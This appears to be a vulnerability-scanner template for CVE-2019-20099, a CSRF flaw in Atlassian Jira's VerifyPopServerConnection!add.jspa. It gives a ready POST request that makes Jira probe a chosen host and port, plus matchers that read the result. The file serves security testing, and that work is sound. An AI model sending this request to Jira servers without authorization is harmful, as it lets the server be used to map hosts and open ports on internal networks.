id: CVE-2019-20099

info:
  name: CSRF in Atlassian Jira VerifyPopServerConnection!add.jspa
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    The VerifyPopServerConnection!add.jspa component in Atlassian Jira Server and Data Center before version 8.7.0 is vulnerable to cross-site request forgery (CSRF). An attacker could exploit this by tricking an administrative user into making malicious HTTP requests, allowing the attacker to enumerate hosts and open ports on the internal network where Jira server is present.
  impact: |
    Allows attackers to perform unauthorized actions on behalf of authenticated users
  remediation: |
    Implement CSRF protection mechanisms such as anti-CSRF tokens
  reference:
    - https://www.tenable.com/security/research/tra-2020-05
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cve-id: CVE-2019-20099
    cwe-id: CWE-352
    epss-score: 0.00082
    epss-percentile: 0.3668
    cpe: cpe:2.3:a:atlassian:jira_data_center:*:*:*:*:*:*:*:*
  metadata:
    vendor: atlassian
    product: jira_data_center
    shodan-query: http.component:"Atlassian Jira"

http:
  - method: POST
    path:
      - "{{BaseURL}}/secure/admin/VerifyPopServerConnection!add.jspa"

    body: |
      name=bob&description=desc&from=bob%40email.com&prefix=prefix&protocol=pop&serverName={{Hostname}}&port=110&timeout=10000&username=&password=&jndiLocation=&id=10000&type=pop

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Connection successful"
          - "Server not responding"
        part: body
